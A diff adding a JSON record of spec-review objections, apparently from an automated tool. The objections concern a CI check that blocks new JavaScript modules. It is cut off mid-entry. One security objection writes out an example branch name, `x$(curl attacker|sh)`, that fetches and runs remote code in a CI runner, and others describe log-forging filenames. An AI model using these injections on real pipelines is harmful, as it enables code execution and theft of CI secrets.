@@ -1,0 +1,450 @@
+{
+  "schema_version": 1,
+  "faff_version": "0.44.0",
+  "verdict": "reject-approach",
+  "final_verdict": "reject-approach",
+  "rounds_total": 5,
+  "objections": [
+    {
+      "lens": "infosec",
+      "severity": "major",
+      "claim": "The spec's stated design principle is \"Mechanical, not review judgement… fails CI on the PR that breaks it\" (§1 WHY), but the mechanism it chooses makes the enforcement advisory for exactly the actor it targets. A PR adding `bin/lib/evil.js` satisfies the check by adding `evil.js` to `legacy-js-modules.json` in the same commit; the spec itself names this as the intended path (\"the only way to add a JavaScript module is to add its basename … in the same PR\"). There is no ratchet: the spec explicitly rejects base-branch comparison (\"No base-branch comparison\"), so nothing distinguishes \"entry added for a genuinely legacy module\" from \"entry added to admit this PR's new module\". The allowlist \"only shrinks\" is enforced only against the tree, never against history, so it can grow arbitrarily. The DONE item \"A PR that adds a new JavaScript module to `bin/lib` with no TypeScript source fails `faff regions check`\" is true only for PRs that decline to also edit the allowlist — i.e. it is a review gesture, contradicting the principle the ticket exists to install.",
+      "evidence": "§3 \"How 'only shrinks' is enforced\" — \"Addition is a visible gesture\"; \"No base-branch comparison. The check does not compare against `origin/main`.\" §1 design principle \"Mechanical, not review judgement.\"",
+      "predicted_consequence": "A contributor (or a compromised/pressured reviewer pass) lands a JavaScript module with no TypeScript source and CI passes; the governance rule the ticket claims to enforce is bypassable by a one-line diff in the same PR, and the allowlist monotonically grows back to covering everything.",
+      "spec_anchor": "how-only-shrinks-is-enforced",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: a --base ratchet (rule 4) fails any allowlist entry absent at the PR base; CI passes it on pull requests and pushes. Accepted by the operator at round 5 (human accept).",
+      "first_round": 1,
+      "last_round": 1,
+      "occurrences": [
+        {
+          "round": 1,
+          "severity": "major",
+          "claim": "The spec's stated design principle is \"Mechanical, not review judgement… fails CI on the PR that breaks it\" (§1 WHY), but the mechanism it chooses makes the enforcement advisory for exactly the actor it targets. A PR adding `bin/lib/evil.js` satisfies the check by adding `evil.js` to `legacy-js-modules.json` in the same commit; the spec itself names this as the intended path (\"the only way to add a JavaScript module is to add its basename … in the same PR\"). There is no ratchet: the spec explicitly rejects base-branch comparison (\"No base-branch comparison\"), so nothing distinguishes \"entry added for a genuinely legacy module\" from \"entry added to admit this PR's new module\". The allowlist \"only shrinks\" is enforced only against the tree, never against history, so it can grow arbitrarily. The DONE item \"A PR that adds a new JavaScript module to `bin/lib` with no TypeScript source fails `faff regions check`\" is true only for PRs that decline to also edit the allowlist — i.e. it is a review gesture, contradicting the principle the ticket exists to install.",
+          "spec_anchor": "how-only-shrinks-is-enforced"
+        }
+      ]
+    },
+    {
+      "lens": "infosec",
+      "severity": "minor",
+      "claim": "Rule 1's diagnostic interpolates the on-disk filename verbatim: `TS-FIRST — <file>: new bin/lib module has no TypeScript source`. The filename comes from `readdirSync` of the tree (§4.1 `regionsJsModules`), and the check's contract is consumed by CI log parsing and humans. A file named e.g. `x.js\\nPASS  regions check: …` (legal on Linux filesystems) forges a PASS line or an arbitrary diagnostic in the CI log. The spec validates allowlist *entries* (§4.5: bare basenames ending `.js`/`.mjs`/`.cjs`) but never validates the filenames the scan itself produces before printing them.",
+      "evidence": "§3 rule 1 diagnostic format; §4.1 `regionsJsModules(dir)` lists files with no stated name validation; §4.5 validates only allowlist entries.",
+      "predicted_consequence": "A crafted filename in a PR's tree can spoof a passing `regions check` line or arbitrary text into the CI log that a human or log-scraping gate trusts.",
+      "spec_anchor": "4-1-pure-functions-in-regions-js",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: every interpolated value in a TS-FIRST line is JSON-quoted, and a scanned name with a control character exits 2. Accepted by the operator at round 5 (human accept).",
+      "first_round": 1,
+      "last_round": 1,
+      "occurrences": [
+        {
+          "round": 1,
+          "severity": "minor",
+          "claim": "Rule 1's diagnostic interpolates the on-disk filename verbatim: `TS-FIRST — <file>: new bin/lib module has no TypeScript source`. The filename comes from `readdirSync` of the tree (§4.1 `regionsJsModules`), and the check's contract is consumed by CI log parsing and humans. A file named e.g. `x.js\\nPASS  regions check: …` (legal on Linux filesystems) forges a PASS line or an arbitrary diagnostic in the CI log. The spec validates allowlist *entries* (§4.5: bare basenames ending `.js`/`.mjs`/`.cjs`) but never validates the filenames the scan itself produces before printing them.",
+          "spec_anchor": "4-1-pure-functions-in-regions-js"
+        }
+      ]
+    },
+    {
+      "lens": "QA",
+      "severity": "major",
+      "claim": "the spec does not define a verifiable failure mode for the generation of the `legacy-js-modules.json` file, meaning the core enforcement mechanism can fail silently or incorrectly.",
+      "evidence": "\"The allowlist is generated at build time from the build's base, not frozen at today's 176.\" (Section 3, What) and \"Generated once at build time by listing the base's `bin/lib` JS modules that have no `.ts` sibling.\" (Section 4.3, The allowlist file).",
+      "predicted_consequence": "if the build environment fails to execute the generation script, or if the script fails to correctly parse the base branch's file structure, the `faff regions check` will either run against an empty/incorrect allowlist (causing a massive, non-specific failure) or run against a missing file (which is covered by the \"missing allowlist\" check, but not the generation failure itself). The spec relies on the *correctness* of the generated data, which is not asserted or tested.",
+      "spec_anchor": "what-",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the allowlist checks itself (rules 1 and 2 fail any wrong entry), plus a real-tree test that compares it with an independently computed set. Accepted by the operator at round 5 (human accept).",
+      "first_round": 1,
+      "last_round": 1,
+      "occurrences": [
+        {
+          "round": 1,
+          "severity": "major",
+          "claim": "the spec does not define a verifiable failure mode for the generation of the `legacy-js-modules.json` file, meaning the core enforcement mechanism can fail silently or incorrectly.",
+          "spec_anchor": "what-"
+        }
+      ]
+    },
+    {
+      "lens": "QA",
+      "severity": "minor",
+      "claim": "the definition of a \"stale\" allowlist entry is clear, but the spec does not explicitly define the expected behavior for a file that is *renamed* in a PR, which could lead to a false positive or negative depending on the timing of the rename relative to the allowlist generation.",
+      "evidence": "Rule 2: \"each allowlist entry that is not a current JS file, or whose base has a TypeScript source, goes to violations.\" (Section 4.1, `regionsTsFirst`).",
+      "predicted_consequence": "if `bin/lib/old.js` is renamed to `bin/lib/new.js`, the entry `\"old\"` in the allowlist becomes a \"missing file\" violation (Rule 2), and the new file `\"new.js\"` is an \"unallowlisted new module\" violation (Rule 1). While this is technically covered, the spec does not clarify if a rename should be treated as a single atomic conversion event or two separate violations.",
+      "spec_anchor": "regions-js-modules",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: a rename is defined as a removal plus an addition, deliberately; a test covers both diagnostics. Accepted by the operator at round 5 (human accept).",
+      "first_round": 1,
+      "last_round": 1,
+      "occurrences": [
+        {
+          "round": 1,
+          "severity": "minor",
+          "claim": "the definition of a \"stale\" allowlist entry is clear, but the spec does not explicitly define the expected behavior for a file that is *renamed* in a PR, which could lead to a false positive or negative depending on the timing of the rename relative to the allowlist generation.",
+          "spec_anchor": "regions-js-modules"
+        }
+      ]
+    },
+    {
+      "lens": "architectural",
+      "severity": "major",
+      "claim": "The spec applies all four rules uniformly to \"the scan dir from the existing `FAFF_EMIT_COVERAGE_TS_DIR` seam or `__dirname`\", but rule 3 (a `.ts` not in `tsconfig.json` `include` → malformed, exit 2) is incompatible with a fixture scan dir: no fixture `.ts` will ever be in the real `tsconfig.json` `include`, so every seamed fixture containing a `.ts`/`.js` pair — exactly the shape the FAFF-1170 emit-floor pass case uses — now exits 2 before the check can pass. The spec's own test list includes \"a fixture `.ts` with a `.js` sibling but no `include` entry → exit 2\", showing the collision is real, yet it never states whether rule 3 honours the seam, and its test plan (\"new file `test/ts-first.test.mjs` (or new cases in `test/emit-coverage.test.mjs`)\") says nothing about the existing FAFF-1170 command-level tests that drive `regions check` through the seam and will now fail or change exit codes.",
+      "evidence": "§4.2 \"the scan dir comes from the existing `FAFF_EMIT_COVERAGE_TS_DIR` seam or `__dirname`\"; context: `test/emit-coverage.test.mjs` is \"the FAFF-1170 tests, including the command-level test that drives `regions check` through `FAFF_EMIT_COVERAGE_TS_DIR`\"; §4.6 test plan.",
+      "predicted_consequence": "the builder must invent an unstated design decision mid-build — either rule 3 ignores the seam (which then makes the spec's own \"fixture `.ts` not in `include` → exit 2\" command test impossible via the seam and forces a different mechanism the spec doesn't name), or existing FAFF-1170 tests are silently re-scoped/rewritten with fixture `include` files that don't correspond to the real tsconfig. Either path is a behaviour decision the spec was supposed to make.",
+      "spec_anchor": "42-wiring-into-regions-check",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the seam dir carries its own tsconfig.json and allowlist; the FAFF-1170 tests exit at the emit floor first, so they are unchanged. Accepted by the operator at round 5 (human accept).",
+      "first_round": 2,
+      "last_round": 2,
+      "occurrences": [
+        {
+          "round": 2,
+          "severity": "major",
+          "claim": "The spec applies all four rules uniformly to \"the scan dir from the existing `FAFF_EMIT_COVERAGE_TS_DIR` seam or `__dirname`\", but rule 3 (a `.ts` not in `tsconfig.json` `include` → malformed, exit 2) is incompatible with a fixture scan dir: no fixture `.ts` will ever be in the real `tsconfig.json` `include`, so every seamed fixture containing a `.ts`/`.js` pair — exactly the shape the FAFF-1170 emit-floor pass case uses — now exits 2 before the check can pass. The spec's own test list includes \"a fixture `.ts` with a `.js` sibling but no `include` entry → exit 2\", showing the collision is real, yet it never states whether rule 3 honours the seam, and its test plan (\"new file `test/ts-first.test.mjs` (or new cases in `test/emit-coverage.test.mjs`)\") says nothing about the existing FAFF-1170 command-level tests that drive `regions check` through the seam and will now fail or change exit codes.",
+          "spec_anchor": "42-wiring-into-regions-check"
+        }
+      ]
+    },
+    {
+      "lens": "infosec",
+      "severity": "major",
+      "claim": "The spec requires the validate workflow to run `faff regions check --base \"origin/${{ github.base_ref }}\"` inside a `run:` step. `github.base_ref` is attacker-influenced context: a PR author chooses the target branch, and git branch names may contain `$`, backticks-free but `$()`-capable characters (git check-ref-format forbids space, `~^:?*[\\`, control chars, `..` — but not `$`). A branch named e.g. `x$(curl attacker|sh)` created by anyone with write access to the base repo, targeted by a PR, executes arbitrary shell in the CI runner when the workflow interpolates it unquoted-context into `run:`. The spec mandates the exact command shape, so this is not a careless-build detail; the spec text itself is the injection site.",
+      "evidence": "\"The CI change: the `regions check` step in `validate.yml` runs `faff regions check --base \"origin/${{ github.base_ref }}\"` on `pull_request` events, after `git fetch --depth=1 origin \"+refs/heads/${{ github.base_ref }}:refs/remotes/origin/${{ github.base_ref }}\"`\" — both interpolations are in shell context.",
+      "predicted_consequence": "arbitrary command execution on the CI runner under a branch name chosen by a PR author with write access to the base repo; from there, secrets available to the validate job (e.g. the npm token used by `npm ci`) are exfiltrable.",
+      "spec_anchor": "how-only-shrinks-is-enforced",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: event values pass only through env:, never interpolated into run:, and --base validates the ref. Accepted by the operator at round 5 (human accept).",
+      "first_round": 2,
+      "last_round": 2,
+      "occurrences": [
+        {
+          "round": 2,
+          "severity": "major",
+          "claim": "The spec requires the validate workflow to run `faff regions check --base \"origin/${{ github.base_ref }}\"` inside a `run:` step. `github.base_ref` is attacker-influenced context: a PR author chooses the target branch, and git branch names may contain `$`, backticks-free but `$()`-capable characters (git check-ref-format forbids space, `~^:?*[\\`, control chars, `..` — but not `$`). A branch named e.g. `x$(curl attacker|sh)` created by anyone with write access to the base repo, targeted by a PR, executes arbitrary shell in the CI runner when the workflow interpolates it unquoted-context into `run:`. The spec mandates the exact command shape, so this is not a careless-build detail; the spec text itself is the injection site.",
+          "spec_anchor": "how-only-shrinks-is-enforced"
+        }
+      ]
+    },
+    {
+      "lens": "infosec",
+      "severity": "minor",
+      "claim": "The rule-4 diagnostic is `TS-FIRST — <file>: added to legacy-js-modules.json since <ref>`. The spec's quoting rule covers \"every file name in a `TS-FIRST` line\"; `<ref>` is not a file name, so a ref containing a newline or control characters (it is a free-form CLI argument, and in CI it derives from `github.base_ref`) can forge additional log lines in the check output that humans and any log-parsing downstream read as gate output.",
+      "evidence": "rule 4 diagnostic text in WHAT; \"Diagnostics never print a raw filename. Every file name in a `TS-FIRST` line is printed `JSON.stringify`-quoted\" — scoped to file names only.",
+      "predicted_consequence": "a forged second line in `regions check` stderr (e.g. a fake `PASS` line) in CI logs; misleading, not directly exploitable.",
+      "spec_anchor": "diagnostics-never-print-a-raw-filename",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the --base ref is JSON-quoted in diagnostics like file names. Accepted by the operator at round 5 (human accept).",
+      "first_round": 2,
+      "last_round": 2,
+      "occurrences": [
+        {
+          "round": 2,
+          "severity": "minor",
+          "claim": "The rule-4 diagnostic is `TS-FIRST — <file>: added to legacy-js-modules.json since <ref>`. The spec's quoting rule covers \"every file name in a `TS-FIRST` line\"; `<ref>` is not a file name, so a ref containing a newline or control characters (it is a free-form CLI argument, and in CI it derives from `github.base_ref`) can forge additional log lines in the check output that humans and any log-parsing downstream read as gate output.",
+          "spec_anchor": "diagnostics-never-print-a-raw-filename"
+        }
+      ]
+    },
+    {
+      "lens": "QA",
+      "severity": "minor",
+      "claim": "Section 4.5 specifies \"An allowlist entry with a path or a non-JS extension: `malformed` (exit 2)\", but the DONE item enumerating malformed-allowlist causes lists only \"absent, unparseable, unsorted or duplicate-entry\", and no case in the 4.6 test inventory exercises a path-bearing or wrong-extension entry. A build that never implements the shape check satisfies every DONE criterion and every named test.",
+      "evidence": "DONE item \"An absent, unparseable, unsorted or duplicate-entry allowlist fails with exit 2, naming the file\"; test list \"command: an unsorted or duplicate allowlist → exit 2\"; normative source `### 4.5 Edge cases`.",
+      "predicted_consequence": "A PR can add an allowlist entry like `bin/lib/evil.js` or `notes.txt`, the check reads it as a nonexistent JS file and reports it as a rule-2 *violation* (exit 1) instead of the specified `malformed` (exit 2) — or silently misclassifies it — and no test, scenario, or DONE item fails. The 4.5 behaviour ships unspecified-by-acceptance.",
+      "spec_anchor": "45-edge-cases",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: DONE items and tests now cover path and extension allowlist entries (exit 2). Accepted by the operator at round 5 (human accept).",
+      "first_round": 2,
+      "last_round": 2,
+      "occurrences": [
+        {
+          "round": 2,
+          "severity": "minor",
+          "claim": "Section 4.5 specifies \"An allowlist entry with a path or a non-JS extension: `malformed` (exit 2)\", but the DONE item enumerating malformed-allowlist causes lists only \"absent, unparseable, unsorted or duplicate-entry\", and no case in the 4.6 test inventory exercises a path-bearing or wrong-extension entry. A build that never implements the shape check satisfies every DONE criterion and every named test.",
+          "spec_anchor": "45-edge-cases"
+        }
+      ]
+    },
+    {
+      "lens": "architectural",
+      "severity": "minor",
+      "claim": "Rule 4's \"a base with no allowlist file passes rule 4\" is not limited to this ticket's own build PR. Any PR whose base predates the allowlist — including a long-lived feature branch rebased onto pre-allowlist `main`, or a competing PR opened in the window before the build PR merges — can add `legacy-js-modules.json` **and** `evil.js` **and** the `evil.js` entry in one commit. Rules 1 and 2 are then satisfied (the entry matches a current unpaired JS file), rule 4 passes because the base has no file, and the module is admitted permanently: once merged, `main` carries the entry, and every later PR's base contains it, so the ratchet never flags it. The spec's own rationale for rule 4 is that without it \"a PR could add `evil.js` and its allowlist entry together and pass, which would turn the rule back into review judgement\" — the carve-out recreates precisely that for the bootstrap window, and the spec presents the carve-out as unconditionally safe.",
+      "evidence": "§\"How 'only shrinks' is enforced\" — \"**A base with no allowlist file** passes rule 4. This is the bootstrapping case: the PR that builds this ticket, or a base older than it.\" The spec names \"a base older than it\" as a passing case without noting that such a base admits arbitrary new entries.",
+      "predicted_consequence": "a PR merged during the bootstrap window (spec merged, build PR not yet merged) permanently allowlists a plain-JavaScript module past the ratchet, and FAFF-1432's conversion list never learns about it — the exact outcome rule 4 was added to prevent.",
+      "spec_anchor": "how-only-shrinks-is-enforced",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: a base with no allowlist file is checked against a set derived from the base tree, never passed. Accepted by the operator at round 5 (human accept).",
+      "first_round": 3,
+      "last_round": 3,
+      "occurrences": [
+        {
+          "round": 3,
+          "severity": "minor",
+          "claim": "Rule 4's \"a base with no allowlist file passes rule 4\" is not limited to this ticket's own build PR. Any PR whose base predates the allowlist — including a long-lived feature branch rebased onto pre-allowlist `main`, or a competing PR opened in the window before the build PR merges — can add `legacy-js-modules.json` **and** `evil.js` **and** the `evil.js` entry in one commit. Rules 1 and 2 are then satisfied (the entry matches a current unpaired JS file), rule 4 passes because the base has no file, and the module is admitted permanently: once merged, `main` carries the entry, and every later PR's base contains it, so the ratchet never flags it. The spec's own rationale for rule 4 is that without it \"a PR could add `evil.js` and its allowlist entry together and pass, which would turn the rule back into review judgement\" — the carve-out recreates precisely that for the bootstrap window, and the spec presents the carve-out as unconditionally safe.",
+          "spec_anchor": "how-only-shrinks-is-enforced"
+        }
+      ]
+    },
+    {
+      "lens": "architectural",
+      "severity": "minor",
+      "claim": "The spec pins the helper to `git show <ref>:plugin/skills/faff/legacy-js-modules.json`. A git pathspec after the colon is resolved relative to the process cwd, and `regions.js` runs wherever `faff` was invoked. From `plugin/skills/faff` — the directory where the TypeScript toolchain, `tsconfig.json`, and the allowlist actually live, and where a developer working on a conversion will naturally run `faff regions check --base main` — the pathspec resolves to `plugin/skills/faff/plugin/skills/faff/legacy-js-modules.json`, which does not exist. Per the spec's own mapping, that git failure is \"any other failure\" → `malformed` → exit 2, so the documented local ratchet check fails with a misleading diagnostic in the most natural working directory.",
+      "evidence": "§4.1 — \"It runs `git show <ref>:plugin/skills/faff/legacy-js-modules.json`\"; §\"How 'only shrinks' is enforced\" — \"A `git show` failure for any other reason (an unknown ref, git missing) is `malformed` (exit 2).\"",
+      "predicted_consequence": "`faff regions check --base <ref>` exits 2 with a malformed diagnostic for every invocation not made from the repository root, and nothing in the spec or docs row distinguishes this from a genuinely broken base read.",
+      "spec_anchor": "41-pure-functions-in-regionsjs",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: git runs as git -C <toplevel>, so the pathspec resolves the same from any working directory. Accepted by the operator at round 5 (human accept).",
+      "first_round": 3,
+      "last_round": 3,
+      "occurrences": [
+        {
+          "round": 3,
+          "severity": "minor",
+          "claim": "The spec pins the helper to `git show <ref>:plugin/skills/faff/legacy-js-modules.json`. A git pathspec after the colon is resolved relative to the process cwd, and `regions.js` runs wherever `faff` was invoked. From `plugin/skills/faff` — the directory where the TypeScript toolchain, `tsconfig.json`, and the allowlist actually live, and where a developer working on a conversion will naturally run `faff regions check --base main` — the pathspec resolves to `plugin/skills/faff/plugin/skills/faff/legacy-js-modules.json`, which does not exist. Per the spec's own mapping, that git failure is \"any other failure\" → `malformed` → exit 2, so the documented local ratchet check fails with a misleading diagnostic in the most natural working directory.",
+          "spec_anchor": "41-pure-functions-in-regionsjs"
+        }
+      ]
+    },
+    {
+      "lens": "infosec",
+      "severity": "major",
+      "claim": "The TS-first leg scans only files \"directly under `bin/lib`\" (`regionsJsModules(dir)` lists files \"directly in `dir`\", inherited from `regionTsSources()`'s flat `readdirSync`). A contributor who adds `bin/lib/anything/evil.js` — or `bin/lib/anything/evil.mjs` — triggers no rule: it is not scanned by rule 1, has no allowlist interaction, and rule 3 never sees it because there is no `.ts`. The ticket's entire purpose (\"fail CI on a new bin/lib JavaScript module\") is defeated by a `mkdir`. This is a fail-open the spec's own scan definition creates, not a careless-build artifact: the spec pins the flat scan in both WHAT and HOW.",
+      "evidence": "§3 rule 1 (\"A `.js`, `.mjs` or `.cjs` file directly under `bin/lib`\"); §4.1 \"`regionsJsModules(dir)`: lists `.js`, `.mjs` and `.cjs` files directly in `dir`\"; context `regionTsSources()` uses a flat `readdirSync(dir)` filter. The OUT OF SCOPE line excludes files *outside* `bin/lib/`, which does not cover a subdirectory *inside* it.",
+      "predicted_consequence": "a new ungoverned JavaScript module ships in the plugin with CI green; the \"allowlist only shrinks\" invariant is unenforceable for anything not at the top level, and the DONE item \"a PR that adds a new JavaScript module to `bin/lib` … fails `faff regions check`\" is false as written.",
+      "spec_anchor": "3-what",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the scan is recursive under bin/lib, and a symlinked directory exits 2. Accepted by the operator at round 5 (human accept).",
+      "first_round": 3,
+      "last_round": 3,
+      "occurrences": [
+        {
+          "round": 3,
+          "severity": "major",
+          "claim": "The TS-first leg scans only files \"directly under `bin/lib`\" (`regionsJsModules(dir)` lists files \"directly in `dir`\", inherited from `regionTsSources()`'s flat `readdirSync`). A contributor who adds `bin/lib/anything/evil.js` — or `bin/lib/anything/evil.mjs` — triggers no rule: it is not scanned by rule 1, has no allowlist interaction, and rule 3 never sees it because there is no `.ts`. The ticket's entire purpose (\"fail CI on a new bin/lib JavaScript module\") is defeated by a `mkdir`. This is a fail-open the spec's own scan definition creates, not a careless-build artifact: the spec pins the flat scan in both WHAT and HOW.",
+          "spec_anchor": "3-what"
+        }
+      ]
+    },
+    {
+      "lens": "infosec",
+      "severity": "minor",
+      "claim": "The spec states \"The base ref is never interpolated into the `run:` script, because a branch name can carry `$(...)`\" — but the prescribed fetch line `git fetch --depth=1 origin \"+refs/heads/$BASE_REF:refs/remotes/origin/$BASE_REF\"` *is* shell-expanded at run time. `env:` blocks GitHub Actions expression injection, not shell expansion, and git refnames legally permit `$`, `;`, `(`, `)` (they forbid only space, `~ ^ : ? * [ \\` and dot-led/dot-locked components), so a branch named e.g. `x$(…)` expands as a command substitution inside the run script. The spec dictates this exact command shape, so the flaw is in the design, not a careless build.",
+      "evidence": "§3 \"**The CI change:**\" bullet — `env: BASE_REF: ${{ github.base_ref }}` plus the quoted refspec fetch line and the rationale sentence.",
+      "predicted_consequence": "command execution in the validate runner driven by a branch name. Consequence is bounded — a `pull_request` validate job already executes the PR's own code (`npm ci`, tests), so the attacker gains no new authority — which is why this is a hardening edit, not a critical: single-quote or pre-validate `BASE_REF` in the fetch step the same way `--base` is validated.",
+      "spec_anchor": "the-ci-change",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed with a note: a double-quoted variable is never re-parsed for $(...), so the fetch was already safe; the step now also validates BASE_REF by regex. Accepted by the operator at round 5 (human accept).",
+      "first_round": 3,
+      "last_round": 3,
+      "occurrences": [
+        {
+          "round": 3,
+          "severity": "minor",
+          "claim": "The spec states \"The base ref is never interpolated into the `run:` script, because a branch name can carry `$(...)`\" — but the prescribed fetch line `git fetch --depth=1 origin \"+refs/heads/$BASE_REF:refs/remotes/origin/$BASE_REF\"` *is* shell-expanded at run time. `env:` blocks GitHub Actions expression injection, not shell expansion, and git refnames legally permit `$`, `;`, `(`, `)` (they forbid only space, `~ ^ : ? * [ \\` and dot-led/dot-locked components), so a branch named e.g. `x$(…)` expands as a command substitution inside the run script. The spec dictates this exact command shape, so the flaw is in the design, not a careless build.",
+          "spec_anchor": "the-ci-change"
+        }
+      ]
+    },
+    {
+      "lens": "QA",
+      "severity": "minor",
+      "claim": "The `## Scenarios` unit covers rules 1, 2, 3 and the real-tree pass, but rule 4 (allowlist growth since `<ref>` fails CI) has zero scenarios — despite being the spec's central enforcement claim (\"the allowlist only shrinks\" is a design principle; \"With `--base <ref>`, an allowlist entry absent at `<ref>` fails with exit 1\" is a DONE item; the ratchet exists specifically to stop \"a PR could add `evil.js` and its allowlist entry together and pass\"). The behaviour that motivates the entire `--base` flag and the `validate.yml` change is asserted nowhere in the section the holdout judges for coverage.",
+      "evidence": "`## Scenarios` (four units, none exercising `--base` or the ratchet); contrast `### 4.6 Tests`, which has three rule-4 cases, and DONE items \"With `--base <ref>`, an allowlist entry absent at `<ref>` fails with exit 1…\" and \"`validate.yml` runs `faff regions check --base …` on pull requests\".",
+      "predicted_consequence": "A holdout or builder reading the Scenarios unit concludes the ratchet is an untested addendum rather than a required behaviour; the attack the ratchet exists to stop (module + allowlist entry landing in one PR, caught only via the CI `--base` path) has no Given/When/Then, so a build that wires `--base` incorrectly in `validate.yml` while passing every listed scenario looks scenario-complete.",
+      "spec_anchor": "scenarios",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: scenarios added for the rule-4 ratchet and the pre-allowlist base. Accepted by the operator at round 5 (human accept).",
+      "first_round": 3,
+      "last_round": 3,
+      "occurrences": [
+        {
+          "round": 3,
+          "severity": "minor",
+          "claim": "The `## Scenarios` unit covers rules 1, 2, 3 and the real-tree pass, but rule 4 (allowlist growth since `<ref>` fails CI) has zero scenarios — despite being the spec's central enforcement claim (\"the allowlist only shrinks\" is a design principle; \"With `--base <ref>`, an allowlist entry absent at `<ref>` fails with exit 1\" is a DONE item; the ratchet exists specifically to stop \"a PR could add `evil.js` and its allowlist entry together and pass\"). The behaviour that motivates the entire `--base` flag and the `validate.yml` change is asserted nowhere in the section the holdout judges for coverage.",
+          "spec_anchor": "scenarios"
+        }
+      ]
+    },
+    {
+      "lens": "architectural",
+      "severity": "major",
+      "claim": "The spec makes subdirectories first-class for rule 1 (`regionsJsModules` scans \"anywhere under `bin/lib`, at any depth\", and a `sub/evil.js` scenario is named) but explicitly leaves the FAFF-1170 emit floor's scan flat (\"the FAFF-1170 emit floor's own flat scan is unchanged\"). `regionTsSources()` is a flat `readdirSync` (context: regions.js 36–70), so a `bin/lib/sub/x.ts` is invisible to the emit floor. The spec's own rationale for rule 3 is that a `.ts` must be provably emit-governed — but for a subdirectory `.ts` that IS in `include`, the governance still fails: the emit floor misses it, and the CI stale-emit job's `git diff --exit-code` does not flag untracked files, so a build that creates a never-committed `bin/lib/sub/x.js` shows a clean diff. Every leg passes while the governed artifact (the committed emit) is missing — exactly the un-emitted, un-governed state FAFF-1170's comment exists to prevent, and the runtime `require` of `sub/x.js` fails on the merged tree.",
+      "evidence": "§4.1 \"`regionsJsModules(dir)`: lists `.js`, `.mjs` and `.cjs` files under `dir` recursively… TypeScript sources are listed the same way for the TS-first leg; the FAFF-1170 emit floor's own flat scan is unchanged\"; §3 rule 3 rationale (\"the governed emit cannot be proved fresh\"); context `regions.js` `regionTsSources()` flat scan; validate.yml freshness step relies on `git diff --exit-code`, which ignores untracked files.",
+      "predicted_consequence": "A PR adds `bin/lib/sub/x.ts` + `bin/lib/sub/x.ts` in `tsconfig.json` `include` with no committed `bin/lib/sub/x.js`: `regions check` exits 0 (flat emit floor misses it; rule 1 sees no `.js`; rule 3 sees the include entry), the CI stale-emit job passes (the freshly built `x.js` is untracked, so `git diff --exit-code` is clean), and main ships a TypeScript module with no committed emit.",
+      "spec_anchor": "41-pure-functions-in-regionsjs",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the FAFF-1170 emit floor switches to the same recursive lister, so a nested .ts with no committed .js exits 2. Accepted by the operator at round 5 (human accept).",
+      "first_round": 4,
+      "last_round": 4,
+      "occurrences": [
+        {
+          "round": 4,
+          "severity": "major",
+          "claim": "The spec makes subdirectories first-class for rule 1 (`regionsJsModules` scans \"anywhere under `bin/lib`, at any depth\", and a `sub/evil.js` scenario is named) but explicitly leaves the FAFF-1170 emit floor's scan flat (\"the FAFF-1170 emit floor's own flat scan is unchanged\"). `regionTsSources()` is a flat `readdirSync` (context: regions.js 36–70), so a `bin/lib/sub/x.ts` is invisible to the emit floor. The spec's own rationale for rule 3 is that a `.ts` must be provably emit-governed — but for a subdirectory `.ts` that IS in `include`, the governance still fails: the emit floor misses it, and the CI stale-emit job's `git diff --exit-code` does not flag untracked files, so a build that creates a never-committed `bin/lib/sub/x.js` shows a clean diff. Every leg passes while the governed artifact (the committed emit) is missing — exactly the un-emitted, un-governed state FAFF-1170's comment exists to prevent, and the runtime `require` of `sub/x.js` fails on the merged tree.",
+          "spec_anchor": "41-pure-functions-in-regionsjs"
+        }
+      ]
+    },
+    {
+      "lens": "infosec",
+      "severity": "minor",
+      "claim": "Rule 4 (allowlist-only-shrinks) fires only when `--base` is supplied, and the CI wiring supplies it only on `pull_request` events. A direct push to `main` (or any protected-by-convention branch) runs `regions check` without `--base`, so a committer with direct push rights can add `evil.js` and its allowlist entry in one commit and pass the exact attack the ratchet exists to close — the \"add the module and its entry together\" bypass the spec explicitly calls out for PRs.",
+      "evidence": "\"It runs without `--base` on `push` events, where `main` has already passed the PR's check\" — this is an assumption about repo configuration, not a property of the design. The spec elsewhere treats the ratchet as the thing that keeps the rule from \"turn[ing] back into review judgement\", but the enforcement is conditional on an event type rather than on the check itself.",
+      "predicted_consequence": "a direct push that adds a JavaScript module plus its allowlist entry lands on `main` with CI green; the module is grandfathered until someone manually notices, and FAFF-1432's conversion list never sees it.",
+      "spec_anchor": "how-only-shrinks-is-enforced",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: push events are ratcheted against github.event.before. Accepted by the operator at round 5 (human accept).",
+      "first_round": 4,
+      "last_round": 4,
+      "occurrences": [
+        {
+          "round": 4,
+          "severity": "minor",
+          "claim": "Rule 4 (allowlist-only-shrinks) fires only when `--base` is supplied, and the CI wiring supplies it only on `pull_request` events. A direct push to `main` (or any protected-by-convention branch) runs `regions check` without `--base`, so a committer with direct push rights can add `evil.js` and its allowlist entry in one commit and pass the exact attack the ratchet exists to close — the \"add the module and its entry together\" bypass the spec explicitly calls out for PRs.",
+          "spec_anchor": "how-only-shrinks-is-enforced"
+        }
+      ]
+    },
+    {
+      "lens": "QA",
+      "severity": "minor",
